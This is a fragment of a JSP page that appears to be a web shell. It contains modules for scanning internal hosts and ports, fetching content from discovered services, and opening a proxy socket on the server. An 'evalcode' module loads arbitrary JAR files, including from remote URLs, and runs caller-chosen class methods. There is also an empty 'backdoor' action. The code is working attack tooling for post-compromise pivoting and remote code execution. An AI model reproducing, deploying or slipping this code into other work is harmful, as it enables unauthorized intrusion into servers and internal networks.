                session.setAttribute("alive_host", alive_host);
        %>
                <%for(String item:alive_host) {%>
                     <li><a href="?module=networkscan&action=port_scan&scan_host=<%=item%>"><%=item %></a> is alive!</li>
                <%} %>
        <%} %>
        <%if(action.equals("port_scan")){
        	List<Integer> open_ports=scaner.portScan(request, response, session, getSession(session,"curent_host"),getSession(session, "port_def"));
    		%>
    		<div>
    		   <%
    		   List<String> hs = (List<String>)session.getAttribute("alive_host");
    		   for(String item:hs){ %>
    		   		<a href="?module=networkscan&action=port_scan&scan_host=<%=item%>"><%=item %></a>|
    		   <%} %>
    		</div>
    		<form action="?module=networkscan&action=port_scan" method="post">
        	   <input type="text" name="scan_host" value="<%=getSession(session,"curent_host")%>">
        	   <input style="width:600px" type="text" name="scan_port" value="<%=getSession(session,"port_def")%>">
        	   <input type="submit" value="scan">
        	</form>
    	<%for(int i:open_ports){%>
        	
        	<li><a href="?module=networkscan&action=open&port=<%=i%>"><%=i %></a> is open!</li>
        	
         <%} %>
        <%} %>
        <%if(action.equals("open")) {
        	String port=getParam(request, "port");
        	FileManage fm = new FileManage();
        	String url = "http://"+getSession(session, "curent_host")+":"+port;
        	String content=fm.curl(url);
        	content=new String(content.getBytes("ISO-8859-1"),"utf-8");
        %>
            <div>
             
             	<div id="url_data"></div>
             	<script>
             	 $("#url_data").html('<%=content%>');
             	</script>
            </div>
        	
        <%} %>
        <%if(action.equals("http_proxy")){ %>
        	<form action="?module=networkscan&action=http_proxy_open" method="post">
        		port:<input type="text" value="<%=getSession(session, "proxy_port") %>" name="port">
        		<input type="submit" value="open http proxy">
        	</form>
        	<a href="?module=networkscan&action=http_proxy_close">close http proxy</a>
        <%} %>
        <%if(action.equals("http_proxy_open")){
        	int proxy_port=Integer.parseInt(getParam(request, "port"));
        	session.setAttribute("proxy_port", proxy_port);
        	testProxy(application, proxy_port);
        	session.setAttribute("error", "proxy is open in "+proxy_port);
        	sendRedirect(response, requestURI+"?module=networkscan&action=http_proxy&error=proxy is open");
        }%>
        <%if(action.equals("http_proxy_close")){
        	try{
        		ServerSocket s=(ServerSocket)application.getAttribute("proxy_socket");
             		s.close();
             		session.setAttribute("error", "proxy socket closed!");
        	}catch(Exception e){
        		out.println(e);
        	}
        	sendRedirect(response, requestURI+"?module=networkscan&action=http_proxy");
        }%>
        <!-- back_proxy start-->
        
        <!-- back_proxy end-->
 </div>
<%} %>
<!-- networkScan mudule end -->
<!-- evalcode mudule start -->
<%if(module.equals("evalcode")) {
        ExecJar ej = new ExecJar();
        URL[] jars=ej.listJar();
        String jar = getParam(request, "jar");
        String class_path = getParam(request, "class_path");
        String method_name = getParam(request, "method_name");
        String params_value = getParam(request,"params_value");
        if(!jar.equals("")){
                session.setAttribute("load_jar",jar );
        }
        if(!class_path.equals("")){
                session.setAttribute("class_path",class_path);
        }
        if(!method_name.equals("")){
                session.setAttribute("method_name",method_name);
        }
        if(!params_value.equals("")){
                session.setAttribute("params_value",params_value);
        }
%>
 
        
     <div id="result">
        
        <form action="?module=evalcode&action=loadJar" method="post">
                 jarfile path:<input type="text" style="width:250px" name="jar" value="<%=getSession(session,"load_jar")%>">
                 <input type="submit" value="load jar file">
                 <input type="button" onclick="$(this).parent().attr('action','?module=evalcode&action=loadToSystemPath');submit()" value="load to system path">
        </form>
        <form action="?module=evalcode&action=eval" method="post">
                 class  path:<input type="text" name="class_path" value="<%=getSession(session,"class_path")%>">
                 method name:<input type="text" name="method_name" style="width:100px" value="<%=getSession(session,"method_name")%>">
                 params:<input type="text" name="params_value"style="width:400px" value="<%=getSession(session,"params_value")%>">
                 <input type="submit" value="eval">
        </form>
        <hr/>
     	result:
     	<%if(action.equals("loadJar")){
     		if(jar.equals("")) return;
     		try{
     			ej.setClassLoader(session, jar);
     	   		out.println("load jar "+jar+" success!");
     		}catch(Exception e){
     			out.println(e);
     		}
        } %>
     	<%if(action.equals("loadToSystemPath")){ 
     		if(jar.equals("")) return;
     		try{
     			ej.loadJar(jar);
     	   		out.println("load jar "+jar+" success!");
     		}catch(Exception e){
     			out.println(e);
     		}  		
     	}%>
     	<%if(action.equals("eval")){
     		
     		MyClassLoader myLoader = ((MyClassLoader)session.getAttribute("my_class_loader"));
     		try{
     			Object result = null;
     			if(params_value.equals("")){
     				result=ej.eval(myLoader,class_path, method_name,new String[]{});
     			}else{
     				result=ej.eval(myLoader,class_path, method_name,params_value.split(","));
     			}
     			if(result instanceof List){
     				out.println(result);
     			}else if(result instanceof Map){
     				out.println(result);
     			}else{
     				out.println(result);
     			}
     		}catch(Exception e){
     			out.println(e);
     		}
                
     	%>
     	<%} %>
     	<%if(action.equals("backdoor")) {
     		
     	}%>
     	<hr/>
     	<pre>
     	exp:
     	file:/E:\code\source\a.jar or file dic or http://www.xxx.com/a.jar
     	
     	//
     	public class EvalCode{
     		public String test(String args[]){
     			
     		}
     	}

     	system jar files:
     	<%for(URL u:jars){ %>
     	    <%=u.getPath() %>
     	<%} %>
     	</pre>
     </div>
<%} %>
<!-- evalcode mudule end -->
</div>
<%} %>
</body>
</html>
<%}%>
